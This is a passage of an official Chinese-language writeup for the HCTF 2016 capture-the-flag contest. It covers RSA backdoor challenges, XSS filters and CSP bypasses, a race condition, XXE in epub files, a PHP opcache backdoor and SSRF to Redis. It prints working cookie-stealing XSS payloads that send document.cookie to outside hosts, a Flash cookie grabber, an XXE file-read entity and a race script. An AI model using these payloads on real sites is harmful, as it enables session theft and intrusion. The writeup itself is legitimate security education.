<pre><code class="hljs dts"><p>题目: <span class="hljs-params">&lt;</span><a href="https://github.com/Hcamael/ctf-library/tree/master/RSA1"><span class="hljs-params">https://github.com/Hcamael/ctf-library/tree/master/RSA1</span></a><span class="hljs-params">&gt;</span></p><p>payload: <span class="hljs-params">&lt;</span><a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py"><span class="hljs-params">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py</span></a><span class="hljs-params">&gt;</span></p></code></pre>
<p></p>
<p>出题时预测的分数在300分左右, 不过看完选手的wp后发现这题出现了重大失误, 现在来看, 这题只值150分左右, 但是实际情况只有23个队解出了该题.</p>
<p>本题思路来源: <b>基于隐藏指数的RSA-HSDβ算法, 全称为隐藏小私有指数δ的RSA后门密钥生成算法</b>.</p>
<p>改算法依赖于<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener</a>小指数攻击方法</p>
<p>后门生成流程:</p>
<p> </p>
<p style="text-align: center"> <a href="http://image.3001.net/images/20161202/14806124648807.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="Image" data-original="http://image.3001.net/images/20161202/14806124648807.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="400"></a>     </p>
<noscript>&lt;img alt="Image" src="http://image.3001.net/images/20161202/14806124648807.png!small" width="400" height="650"&gt;     &lt;/p&gt;</noscript>
<p>其中`β`是在`2^(k-1) ± 2^(k/2)`范围内的素数, 转置函数的作用是在`β`非常大的情况下, 返回值可以认为是PRP(Pseudo-Random Permutation). 转置函数可以有好几种形式, 我选取的是一种比较简单的转置函数.</p>
<p>从上面的流程可以看出这题非常的简单, 要逆向也是很容易的, 所以该题为本届HCTF密码学的签到题</p>
<p>逆向思路:</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806125737610.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="hctf_rsa1_2.png" data-original="http://image.3001.net/images/20161202/14806125737610.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="300"></a> </p>
<noscript>&lt;img alt="hctf_rsa1_2.png" src="http://image.3001.net/images/20161202/14806125737610.png!small" width="300" height="700"&gt; &lt;/p&gt;</noscript>
<p>从上图可以看出本题只涉及到了wiener算法, 难度差不多是150左右</p>
<blockquote><p>出题时本来是准备考两种算法的, 一种是wiener算法, 一种是[Riemann's hypothesis and tests for primality](<a href="https://www.cs.cmu.edu/">https://www.cs.cmu.edu/</a>~glmiller/Publications/Papers/Mi76.pdf), payload中的`divide_pq`函数, 已知e, d, n质因数分解p和q(&lt;<a href="http://www.di-mgt.com.au/rsa_factorize_n.html">http://www.di-mgt.com.au/rsa_factorize_n.html</a>&gt;)</p>
<p>原本设计着算出`(ϵ, δ)`后, 根据`(ϵ, δ, n)`分解出`q`和`p`, 但是出题失误, 导致只需要wiener算法就能getflag</p>
</blockquote>
<p>PS1: 不过还是出现了非预期, ROIS的dalao利用wiener算法分解出`p`和`q`, &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa_s.py">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa_s.py</a>&gt;</p>
<p>PS2: 基于隐藏指数的RSA后门生成算法除了本题涉及的还有`RSA-HSPEβ`和`RSA-HSEβ`</p>
<h2><b><br></b></h2>
<h2><b><br></b></h2>
<h2><b># Level 3 #</b></h2>
<h3>## Crypto So Cool ##</h3>
<blockquote><p>题目: &lt;<a href="https://github.com/Hcamael/ctf-library/tree/master/RSA2">https://github.com/Hcamael/ctf-library/tree/master/RSA2</a>&gt;</p>
<p>payload:</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py</a>&gt;</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage</a>&gt;</p>
</blockquote>
<p>出题时预测的分数在400分左右, 实际情况只有7个队解出了该题. 和预测差不多, 最后放了一波hint, 要不然可能会更少.</p>
<p><b>本题思路来源: 基于隐藏素数因子的RSA-HPβ算法</b></p>
<p>该后门算法依赖于`Coppersmith partial information attack`算法, <a href="http://inaz2.hatenablog.com/entries/2016/01/20">sage实现该算法</a></p>
<p>后门生成流程:</p>
<p> </p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806131822676.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="hctf_rsa2_1.png" data-original="http://image.3001.net/images/20161202/14806131822676.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="500"></a>     </p>
<noscript>&lt;img alt="hctf_rsa2_1.png" src="http://image.3001.net/images/20161202/14806131822676.png!small" width="500" height="1559"&gt;     &lt;/p&gt;</noscript>
<p> </p>
<p>该算法的核心在于把p的前半部分比特隐写到n中</p>
<blockquote><p>τ的长度为k/16比特</p>
<p>μ的长度为5k/16比特</p>
<p>λ的长度为5k/8比特</p>
<p>所以n的长度为k比特</p>
<p>`p * (q xor random(k/8比特长度))`的前3k/8比特的值是不变的</p>
</blockquote>
<p>所以可以成功把τ, μ隐写到n中</p>
<p>逆向思路:</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806133147878.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="hctf_rsa2_2.png" data-original="http://image.3001.net/images/20161202/14806133147878.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="280"></a>     </p>
<noscript>&lt;img alt="hctf_rsa2_2.png" src="http://image.3001.net/images/20161202/14806133147878.png!small" width="280" height="1378"&gt;     &lt;/p&gt;</noscript>
<p>该题的难点主要在于`Coppersmith partial information attack`算法, 能在放hint前做出的队伍都是在github上找到了该算法的脚本&lt;<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a>&gt;</p>
<h3><b><br></b></h3>
<h3><b><br></b></h3>
<h3><b>## guestbook ##</b></h3>
<p>上来就是一个留言板，看起来就是xss题目，至于下面的md5碰撞，只是为了减少无意义的请求，差不多是验证码的性质，有些人可能没接触过，那么附上一个碰撞脚本</p>
<pre><code class="hljs python"><p><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crack_code</span><span class="hljs-params">(code)</span>:</span></p><p>	str = <span class="hljs-number">10000</span></p><p>	<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</p><p>		m2 = hashlib.md5()</p><p>		m2.update(repr(str))</p><p>		<span class="hljs-keyword">if</span> (m2.hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]==code):</p><p>			<span class="hljs-keyword">return</span> str</p><p>			<span class="hljs-keyword">break</span></p><p>		str+=<span class="hljs-number">1</span></p><p><span class="hljs-keyword">print</span> crack_code(<span class="hljs-string">'84a3'</span>)</p></code></pre>
<p></p>
<p>差不多4位的md5只要几秒就跑到了，回到题目正题，从代码中我们可以看到基本的过滤</p>
<pre><code class="hljs php"><p><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span></p><p>{</p><p>	$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">'\''</span>,<span class="hljs-string">'\\\\'</span>);</p><p>	$escape = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $escape) . <span class="hljs-string">'/'</span>;</p><p>	$string = preg_replace($escape, <span class="hljs-string">'_'</span>, $string);</p><p>	$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">'select'</span>, <span class="hljs-string">'insert'</span>, <span class="hljs-string">'update'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'where'</span>);</p><p>	$safe = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $safe) . <span class="hljs-string">'/i'</span>;</p><p>	$string = preg_replace($safe, <span class="hljs-string">'hacker'</span>, $string);</p><p>	$xsssafe = <span class="hljs-keyword">array</span>(<span class="hljs-string">'img'</span>,<span class="hljs-string">'script'</span>,<span class="hljs-string">'on'</span>,<span class="hljs-string">'svg'</span>,<span class="hljs-string">'link'</span>);</p><p>	$xsssafe = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $xsssafe) . <span class="hljs-string">'/i'</span>;</p><p>	<span class="hljs-keyword">return</span> preg_replace($xsssafe, <span class="hljs-string">''</span>, $string);</p><p>}</p></code></pre>
<p></p>
<p>我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于</p>
<p>`scrscriptipt`这样。</p>
<p>所以其实关键在于CSP</p>
<pre><code class="hljs javascript">Content-Security-Policy:<span class="hljs-keyword">default</span>-src <span class="hljs-string">'self'</span>; script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'unsafe-inline'</span>; font-src <span class="hljs-string">'self'</span> fonts.gstatic.com; style-src <span class="hljs-string">'self'</span> <span class="hljs-string">'unsafe-inline'</span>; img-src <span class="hljs-string">'self'</span></code></pre>
<p>不熟悉的人可能并不清楚其中的CSP有什么样的问题，试试上，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。</p>
<p><b>### 跳转绕过 ###</b></p>
<pre><code class="hljs apache"><p><span class="hljs-section">&lt;scrscriptipt&gt;</span><span class="hljs-attribute">window</span>.open(<span class="hljs-string">"</span><a href="http://xxxx:8080/cookie.asp?msg="><span class="hljs-string">http://xxxx:8080/cookie.asp?msg=</span></a><span class="hljs-string">"</span>+document.body)&lt;/scrscr iptipt&gt;</p><p>&lt;scrscriptipt&gt;window.locatioonn.href<span class="hljs-number">%3</span>d<span class="hljs-string">"http%3a//</span><a href="http://www.example.com/xss/write.php%3fdomain%3d"><span class="hljs-string">www.example.com/xss/write.php%3fdomain%3d</span></a><span class="hljs-string">"</span><span class="hljs-number">%2</span>bescape(document.cookie)<span class="hljs-number">%3</span>b&lt;/sscriptcript&gt;</p><p>&lt;scrscriptipt&gt;var a=document.createElement(<span class="hljs-string">"a"</span>);a.href='<a href="http://xss.com/?cookie=">http://xss.com/?cookie=</a>'+escape(document.cookie);a.click();&lt;/sscriptcript&gt;</p></code></pre>
<p></p>
<p>上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。</p>
<p><b>### chrome对CSP支持的不完整绕过 ###</b></p>
<p>这种也就是我出题的本意，从文章中可以获得对漏洞的整体了解，主要是2篇</p>
<p><a href="http://paper.seebug.org/91/">http://paper.seebug.org/91/</a></p>
<p>当然我自己也写了分析文章<a href="http://lorexxar.cn/2016/10/28/csp-then/">http://lorexxar.cn/2016/10/28/csp-then/</a></p>
<p>这里我的后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload</p>
<pre><code class="hljs javascript">&lt;Scscriptript&gt;<span class="hljs-keyword">var</span> n0t = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"liscriptnk"</span>);n0t.setAttribute(<span class="hljs-string">"rel"</span>, <span class="hljs-string">"prefetch"</span>);n0t.setAttribute(<span class="hljs-string">"href"</span>, <span class="hljs-string">"//xxx:2333/"</span> + <span class="hljs-built_in">document</span>.cookie);<span class="hljs-built_in">document</span>.head.appendChild(n0t);<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Scscriptript</span>&gt;</span></span></code></pre>
<p>后面xss平台或者vps接受一发搞定</p>
<h3></h3>
<h3></h3>
<h3>## 出题人失踪了 (brop) ##</h3>
<p>这一题的内部使用名字是brop，因为这一题的出题思路和做题思路都是来源于一篇论文</p>
<p><a href="http://www.scs.stanford.edu/brop/">http://www.scs.stanford.edu/brop/</a></p>
<p>所以知道这篇论文的人应该很快就能意识到这一题的做法</p>
<h3></h3>
<h3></h3>
<h3>## 必须比香港记者跑得快 ##</h3>
<p>扫目录找到README.md可以得到hint</p>
<blockquote><p>2016.11.11 完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。 判断sessioin['level']是否能在index.php查看管理员才能看到的东西。 XD</p>
<p>2016.11.10 老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。</p>
<p>2016.10 我把注册功能写好了</p>
</blockquote>
<p>条件竞争，直接附上脚本</p>
<pre><code class="hljs python"><p><span class="hljs-comment"># -*- coding:utf-8 -*-</span></p><p><span class="hljs-comment">import requests</span></p><p><span class="hljs-comment">import threading</span></p><p><span class="hljs-comment">for i in range(0,9):</span></p><p><span class="hljs-comment">	a = "cccccccc"+str(i)</span></p><p><span class="hljs-comment">	data = { 'username': a , 'password': a , 'gogogo' : '苟!'}</span></p><p><span class="hljs-comment">	def register(a):</span></p><p><span class="hljs-comment">		r = requests.post(url = "http://changelog.hctf.io/register.php" , data = data )</span></p><p><span class="hljs-comment">	def login(a):</span></p><p><span class="hljs-comment">		r = requests.post(url = "http://changelog.hctf.io/login.php" , data = data)</span></p><p><span class="hljs-comment">		if "You level is zero, so you can't touch me!" not in r.content:</span></p><p><span class="hljs-comment">			print r.content</span></p><p><span class="hljs-comment">			exit()</span></p><p><span class="hljs-comment">	threading.Thread(target = login , args =(a,)).start()</span></p><p><span class="hljs-comment">	threading.Thread(target = register , args =(a,)).start()</span></p></code></pre>
<p></p>
<h3></h3>
<h3></h3>
<h3>## asm ##</h3>
<p>asm的解释器</p>
<p>附带字节码生成</p>
<p>好像大家都是先leak出libc，再做的，但其实并不用leak，替换strcmp@plt 为 malloc@plt即可call system</p>
<h2><b><br></b></h2>
<h2><b><br></b></h2>
<h2><b># Level 4 #</b></h2>
<h3>## 大图书管的牧羊人&amp;&amp;魔法禁书目录 ##</h3>
<p>在公司膜Ricter的时候想到的思路。</p>
<blockquote><p>预期内的做法(general)：</p>
<p>1. 信息泄漏</p>
<p> 2. CBC flip 或者 Padding Oracle 伪造管理员上线</p>
<p> 3. 了解epub文件，构造XXE任意文件读取flag.php</p>
</blockquote>
<p>&gt; 如果没有第一步，作为一道黑盒题目，你能够<b>摸清套路</b>吗？ ^_^</p>
<p>P.S. Aklis灵魂运维，在部署这道题目的时候忘了上vhost的配置了，导致可以在获得admin身份之后直接上传包含webshell的zip压缩包。</p>
<p>用 comm.php 的加解密伪造也是我的锅，密钥是23333，然后我忘了几个3，后来在第五层的禁书目录其实就多了两个3，Orz。</p>
<p>在第四层按我的出题思路怼的师傅可以瞬秒禁书目录。</p>
<p>通过php://filter构造</p>
<pre><code class="hljs xml"><p>XML</p><p><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">payload</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">php:</span>//<span class="hljs-attr">filter</span>/<span class="hljs-attr">read</span>=<span class="hljs-string">convert.base64-encode</span>/<span class="hljs-attr">resource</span>=/<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">html</span>/<span class="hljs-attr">flag.php</span>"&gt;</span></p></code></pre>
<p>直接回显</p>
<pre><code class="hljs xml"><p><span class="hljs-tag">&lt;<span class="hljs-name">navPoint</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"coverpage"</span> <span class="hljs-attr">playOrder</span>=<span class="hljs-string">"0"</span>&gt;</span></p><p><span class="hljs-tag">&lt;<span class="hljs-name">navLabel</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>&amp;payload;<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">navLabel</span>&gt;</span></p></code></pre>
<p>但这样的话，别人能看得到哦，自己忘了覆盖回去让其它选手捡了便宜 XD</p>
<p>&gt; 更合适的作法是通过远程的XXE回显。</p>
<p><b>两题的flag</b></p>
<pre><code class="hljs xml"><p><span class="php"><span class="hljs-meta">&lt;?php</span></span></p><p><span class="php">$flag = <span class="hljs-string">"hctf{Serena_is_the_leading_role}"</span>;</span></p></code></pre>
<pre><code class="hljs xml"><p><span class="php"><span class="hljs-meta">&lt;?php</span></span></p><p><span class="php">$flag = <span class="hljs-string">"hctf{Lillie_is_comming}"</span>;</span></p></code></pre>
<h3></h3>
<h3></h3>
<h3>## secret area ##</h3>
<p>打开页面发现了聊天版性质的站，进出找一找发现有这么几个功能：</p>
<p>注册-&gt;登陆-&gt;可以修改个人信息河头乡-&gt;向任何人留言</p>
<p>稍微测试，不难发现</p>
<pre><code class="hljs ruby">Content-Security-<span class="hljs-symbol">Policy:</span>default-src <span class="hljs-string">'self'</span>; script-<span class="hljs-symbol">src</span><a href="http://sguestbook.hctf.io/static/"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/sguestbook.hctf.io/static</span><span class="hljs-regexp">/</span></a><span class="hljs-regexp">'sha256-n+kMAVS5Xj7r/dv</span>V9ZxAbEX6uEmK+uen+HZXbLhVsVA=<span class="hljs-string">' '</span>sha256-<span class="hljs-number">2</span>zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=<span class="hljs-string">'    '</span>sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=<span class="hljs-string">' '</span>sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=<span class="hljs-string">' '</span>sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=<span class="hljs-string">' '</span>sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=<span class="hljs-string">' '</span>sha256-<span class="hljs-number">2</span>Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=<span class="hljs-string">'    '</span>sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=<span class="hljs-string">' '</span>sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw=<span class="hljs-string">'; font-src</span><a href="http://sguestbook.hctf.io/static/"><span class="hljs-string">http://sguestbook.hctf.io/static/</span></a><span class="hljs-string">fonts.gstatic.com; style-src '</span><span class="hljs-keyword">self</span><span class="hljs-string">' '</span>unsafe-inline<span class="hljs-string">';    img-src '</span><span class="hljs-keyword">self</span><span class="hljs-string">'</span></code></pre>
<p>CSP限制的域差不多符合以下几个条件:</p>
<pre><code class="hljs objectivec"><p><span class="hljs-number">1</span>、script没有开启unsafe-<span class="hljs-keyword">inline</span>，也就是说不允许内联脚本</p><p><span class="hljs-number">2</span>、script只允许<span class="hljs-keyword">static</span>目录，但这个目录下内容不可控</p><p><span class="hljs-number">3</span>、style-src开启了unsafe-<span class="hljs-keyword">inline</span>而且是<span class="hljs-keyword">self</span>（这里其实是不小心的失误）</p><p><span class="hljs-number">4</span>、<span class="hljs-keyword">default</span>-src为<span class="hljs-keyword">self</span>，也就是站内请求都是被许可的</p></code></pre>
<p><b>### 正解 ###</b></p>
<pre><code class="hljs cpp"><p>综合CSP的限制，我们需要回去想想题目中给的条件，有几个比较重要的。</p><p><span class="hljs-number">1</span>、<span class="hljs-keyword">static</span>下不存在任何非静态文件，除了redirect.php</p><p>2、redirect.php的跳转位置可以自定义</p><p><span class="hljs-number">3</span>、我们上传的头像没有任何上传漏洞，上传位置是/upload/</p></code></pre>
<p>这里先给出一篇文章</p>
<p><a href="http://lorexxar.cn/2016/10/31/csp-then2/">http://lorexxar.cn/2016/10/31/csp-then2/</a></p>
<p>根据文章，我们不难发现，现在所有的条件都符合，如果顺着思路到这里，很容易就会想到下一步</p>
<p>构造上传图像为</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> xml = <span class="hljs-keyword">new</span> XMLHttpRequest(); xml.open(<span class="hljs-string">'POST'</span>, <span class="hljs-string">'</span></span><a href="http://sguestbook.hctf.io/submit.php"><span class="javascript"><span class="hljs-string">http://sguestbook.hctf.io/submit.php</span></span></a><span class="javascript"><span class="hljs-string">'</span>, <span class="hljs-literal">true</span>); xml.setRequestHeader(<span class="hljs-string">"Content-type"</span>,<span class="hljs-string">"application/x-www-form-urlencoded"</span>); xml.send(<span class="hljs-string">'to=xxxx&amp;message='</span>+<span class="hljs-built_in">document</span>.cookie);    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p></p>
<p>然后向admin发送</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"</span></span><a href="http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d"><span class="hljs-tag"><span class="hljs-string">http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d</span></span></a><span class="hljs-tag"><span class="hljs-string">"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scriscriptpt</span>&gt;</span></code></pre>
<p><b>### 前面步骤相同，最后的域限制通过跳转来绕过 ###</b></p>
<p>这个其实没什么好说的，其他的部分相同，只有最后一步使用location来获得cookie，payload和上题相同，就不贴了。</p>
<p><b>### 精心构造flash xss ###</b></p>
<p>这种方式是Blue-Whale的师傅想到的，根据上面CSP限制，我们很快就能发现其实对于除script以外的部分都比较友好，只要在域内就可以了，再加上，域内存在上传点，那么我们是不是可以构造一个**Action Script**</p>
<p>payload，头像处上传</p>
<pre><code class="hljs javascript"><p><span class="hljs-keyword">import</span> flash.external.ExternalInterface;</p><p><span class="hljs-keyword">var</span> ck; ck = ExternalInterface.call(<span class="hljs-string">'function(){return document.cookie}'</span>); ua = ExternalInterface.call(<span class="hljs-string">'function(){return navigator.userAgent}'</span>); ExternalInterface.call(<span class="hljs-string">"$.post"</span>,<span class="hljs-string">"submit.php"</span>,<span class="hljs-string">'to=qqc&amp;message=document.cookie'</span>+ck+ua); stop();</p></code></pre>
<p></p>
<p>然后构造</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"</span></span><a href="http://sguestbook.hctf.io/upload/4b3097d0fef014bc099fe305fd2cb685"><span class="hljs-tag"><span class="hljs-string">http://sguestbook.hctf.io/upload/4b3097d0fef014bc099fe305fd2cb685</span></span></a><span class="hljs-tag"><span class="hljs-string">"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"applicatioONn/x-shockwave-flash"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span></code></pre>
<p>这个payload只要浏览器有flash就可以了</p>
<p><b>### 强制刷新多次跳转 ###</b></p>
<p>这里有一种在比赛中遇到的特别的payload，使用的漏洞和前面提到的相同，也是多次跳转导致的目录绕过，但是特别的是，使用了一种特别的手段</p>
<p>payload我没找到，但是类似于</p>
<pre><code class="hljs objectivec">&lt;META HTTP-EQ<span class="hljs-built_in">UIV</span>=<span class="hljs-string">"refresh"</span> CONTENT=<span class="hljs-string">"0; url=data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cDovLzE2My40NC4xNTUuMTc5Ijs8L3NjcmlwdD4="</span>&gt;</code></pre>
<p>上面应该是个错误的payload，但是在守护的过程中的确存在有效payload，只可惜没能记录下来。</p>
<p>我最早看到这个payload，在</p>
<p><a href="http://www.tuicool.com/m/articles/77bABnm">http://www.tuicool.com/m/articles/77bABnm</a></p>
<h3><b><br></b></h3>
<h3><b><br></b></h3>
<h3><b>## web选手的自我修养 ##</b></h3>
<blockquote><p>题目描述：新搭的wp居然爆了漏洞，真气，漏洞修复了却被安了后门，你能找到后门在哪吗？？？提供压缩包为docker镜像</p></blockquote>
<p>这题目其实可以出的特别好，但是由于我个人要管的题目太多了，所以搞着搞着就乱了，导致这道题目被非预期所沦陷了，这里我就重新说一遍正解吧。</p>
<p>首先在正常的题目中，现在在home目录下的脚本是不该存在的，也不会存在所谓的viminfo以及access.log日志。</p>
<p>加载docker之后，首先发现docker中只存在lnmp环境，其余没有任何服务，我们找到`/home/wwwroot/default/`下是web目录，里面放了一个最新版的wp，并且还能找到压缩包</p>
<p>既然题目中是站中安了后门，首先肯定是解压源码，然后diff文件，很快就能发现，源码其实并没有被改变。</p>
<p>那么写一个phpinfo.php页面</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806145541542.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="11.png" data-original="http://image.3001.net/images/20161202/14806145541542.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a>     </p>
<noscript>&lt;img alt="11.png" src="http://image.3001.net/images/20161202/14806145541542.png!small" width="690" height="340"&gt;     &lt;/p&gt;</noscript>
<p>我们发现php版本是7.0.7，接着向下看</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806145995360.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="12.png" data-original="http://image.3001.net/images/20161202/14806145995360.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="690"></a>     </p>
<noscript>&lt;img alt="12.png" src="http://image.3001.net/images/20161202/14806145995360.png!small" width="690" height="353"&gt;     &lt;/p&gt;</noscript>
<p>我们发现不一样的东西。php opcache开启，而且检验一致性的配置已经关闭了（7.0.7增加了这个配置，为了漏洞存在，我关闭了这个）</p>
<p>那么猜测后门被直接写入了bin中，那么大家肯定会想到这个工具。</p>
<p><a href="http://lorexxar.cn/2016/05/27/opcache-jcfx/">http://lorexxar.cn/2016/05/27/opcache-jcfx/</a></p>
<p>也就是我在测试中无意留在镜像中的脚本，但是很多队伍都发现了，这个脚本是存在问题的。</p>
<p>因为在镜像中有个库版本过高，所以整个脚本完全跑不起来，所以我想了另一种分析方式。</p>
<p><b>第一种，时间戳排序法</b></p>
<p>回想漏洞存在的条件，如果真的到了通过这种方式拿后门的情况，写后门一定会写入不容易被改变的位置，因为如果文件被改变，bin就会重新编译。</p>
<p><b>其次，既然我需要写入后门进bin中，肯定需要修改bin，那么文件的时间戳一定会被改变。</b></p>
<p>那么在一群没怎么被改变的文件处，最新的部分时间戳中一定有问题。</p>
<p>那么锁定文件，flag一定是可显字符串，可以没必要分析字节码，直接strings即可</p>
<h3></h3>
<h3></h3>
<h3>## AT Field ##</h3>
<p>### 题目描述 ###</p>
<blockquote><p>Welcome to ATField.</p>
<p>hint：</p>
<p>1: 在第一题里不只有flag，还有第二题的入口</p>
<p>2、扫端口没用，几百线程也没用的呀</p>
<p>3、我从来没说过，flag1那里没有别的东西啊</p>
<p>4、安nosql的服务器是centos</p>
<p>5、mdzz，没人注意到nosql的语法吗</p>
</blockquote>
<p><b>### 解题逻辑 ###</b></p>
<p>AT Field1首先是很简单的ssrf绕过，绕过ssrf之后，大部分人都选择了扫127.0.0.1的端口，想找到本地开启的服务。</p>
<p>为了大家能在有限的时间里不浪费时间，我放出了前3条hint，之所以不想说的太明白，是因为出题的时候，认为这一步是需要扫目录的，在flag1的位置index.php那里，是通过git clone到本地的，虽然我删除了.git，但是却</p>
<p>遗留了README.md，在Readme中，我们获得了很多关于下一步的信息。</p>
<blockquote><p>11.23</p>
<p>ak说上线的.git要都删了，以免被拖源码</p>
<p>11.24</p>
<p>听ak说nosql蛮好用的，link一个玩玩看</p>
<p>11.25</p>
<p>哎呀,docker怎么没有crontab,都不能定时重启，装一个装一个</p>
</blockquote>
<p><b>事实上，在这三句话中能获得信息远远超过你的想象…</b></p>
<p>首先是nosql，我们可以得到服务的大致端口号，这个我相信大部分人都能想想到</p>
<p>其次就是docker，如果你尝试过使用docker来连接容器的话，你就会知道很多隐藏信息</p>
<blockquote><p>1、redis的docker中没有任何多余的服务，crontab也没有，当然也不可能有web服务</p>
<p>2、docker的连接方式类似于内网，所以和题目并不在同一个docker</p>
<p>3、docker内网比较特殊，类似于从192.168.0.1开始，如果前面的ip被占用，就依次递增，由于题目环境并不复杂，所以内网的ip并不是太多，理论上来说，不超过30个请求就能找到目标ip（这里有一个方式是用过host来代替ip，遗憾的是，经过我的测试，host替代会导致python urllib header注入失败）</p>
<p>4、docker的默认用户是root</p>
</blockquote>
<p>或许你可能没有得到那么多信息，那么稍后我们顺着题目思路，来看看这些条件是如何利用的</p>
<p>紧接着很快就能发现整个站是python的，而且请求图片是通过urllib方式，那么很自然的想到了python urllib httpheader注入。</p>
<p>国内主要是这两篇文章</p>
<p><a href="http://www.tuicool.com/articles/2iIj2eR">http://www.tuicool.com/articles/2iIj2eR</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
<p>由于redis写入的文件有莫名的头和尾，所以这里只有centos才能成功通过crontab来弹shell</p>
<pre><code class="hljs php"><p>这里先总结整个流程：</p><p><span class="hljs-number">302</span>-&gt;本机ssrf-&gt;内网-&gt;内网的redis-&gt;python urllib http头注入构造redis请求--&gt;redis写入crontab-&gt;crontab定时执行getshell</p></code></pre>
<p>整个题目最难的其实就是黑盒，因为全程你并不知道是不是写入成功了，所以想要提高成功率，必须在本地redis搭建成功</p>
<p><b>### writeup ###</b></p>
<p><b>#### AT Field1 ####</b></p>
<p>整个题目打开是这样的</p>
